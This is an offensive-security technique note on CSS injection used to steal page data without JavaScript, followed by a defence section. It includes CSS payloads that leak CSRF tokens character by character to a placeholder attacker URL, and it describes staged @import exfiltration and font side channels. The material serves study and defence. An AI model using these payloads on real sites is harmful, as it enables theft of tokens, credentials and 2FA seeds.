---
title: "CSS Injection (Exfiltration without JS)"
type: technique
tags: [css-injection, xss, exfiltration, information-disclosure, web, client-side]
phase: exploitation
date_created: 2026-06-18
date_updated: 2026-06-18
sources: [portswigger-css-injection, payloadsallthethings-css-injection]
---

# CSS Injection (Exfiltration without JS)

## What it is

Injecting attacker-controlled CSS into a page where script execution is blocked but styling is allowed: sanitized HTML (DOMPurify default permits `style`/`class`), markdown renderers, HTML email, strict CSP that stops inline JS but not styles. Pure CSS can read DOM attribute values and exfiltrate them to an attacker server, steal CSRF tokens / hidden inputs / 2FA seeds, and fingerprint the page. The fallback when XSS is filtered. Cross-ref: [[xss]], [[dom-attacks]], [[xs-leak]].

## How it works

CSS selectors can match on attribute values, and several properties trigger a network request (`background: url(...)`, `@import`, `list-style-image`, `cursor`, `border-image`). Combine "match a secret one character at a time" with "fetch a unique URL when it matches" to leak the secret to your logs.

## Techniques

### Attribute-value exfiltration (char by char)

Leak a `value`/`href`/`token` attribute by brute-forcing prefixes; each matching prefix fires a request:

```css
input[name="csrf"][value^="a"]{ background: url(https://attacker/leak?c=a); }
input[name="csrf"][value^="b"]{ background: url(https://attacker/leak?c=b); }
/* ...one rule per candidate char; the firing URL reveals the next char */
```

Iterate: after learning the first char `x`, inject `value^="x"` + next-char rules. Works on hidden inputs, password fields' pre-filled values, API keys rendered into attributes.

### Single-shot leak via @import chaining (no round trips)

Recursive `@import` from your server lets you leak the full token without re-injecting per character. Your stylesheet serves the next batch of selectors based on what has leaked so far, polling the attacker server:

```css
@import url(https://attacker/stage1.css);
/* stage1.css contains the prefix rules; on each hit the server narrows
   the next stage and the page re-imports, walking the whole value */
```

Tooling: `sebdraven/CSS-Exfil`, PortSwigger's CSS-injection lab solver, or a small Flask server that emits staged stylesheets.

### Text content via font ligatures (width side-channel)

When the secret is text (not an attribute), use a custom font where specific ligatures have known widths, then detect which rendered via `@font-face` + an overflow-scrollbar that triggers a `background` fetch. Recovers text node content one substring at a time. Slower; used when the target is body text not an attribute.

### content / attr() reflection

```css
/* if injected near a sensitive element, reflect its attr into a fetched url */
.secret::after{ content: attr(data-token); }
```

## Delivery vectors

- HTML injection with `<script>` filtered but `<style>`/`style=` allowed.
- Dangling-markup variant: an unclosed attribute can swallow following markup into a request even without full CSS (see [[xss]] dangling markup).
- Markdown/rich-text fields, HTML email (many clients render `<style>`), SVG `<style>`.

## Impact

CSRF-token theft (then chain [[csrf]]), pre-filled credential/PII leak, 2FA/OTP seed leak, session-bound hidden values, page fingerprinting. No JS needed, so it defeats `script-src` CSP and HTML sanitizers that keep styling.

## Defence

- CSP without `style-src 'unsafe-inline'`; nonce styles; block external `@import`/`url()` via `style-src`/`img-src`/`font-src` allowlists.
- Sanitizers: strip `style` attributes and `<style>`; do not render untrusted CSS.
- Do not place secrets in DOM attributes; use SameSite + per-request CSRF tokens that rotate.

## Sources

- PortSwigger Web Security Academy, CSS injection labs (slug: portswigger-css-injection) (`https://portswigger.net/web-security/cross-site-scripting/exploiting`).
- PayloadsAllTheThings - CSS Injection (slug: payloadsallthethings-css-injection) (`https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSS%20Injection`).
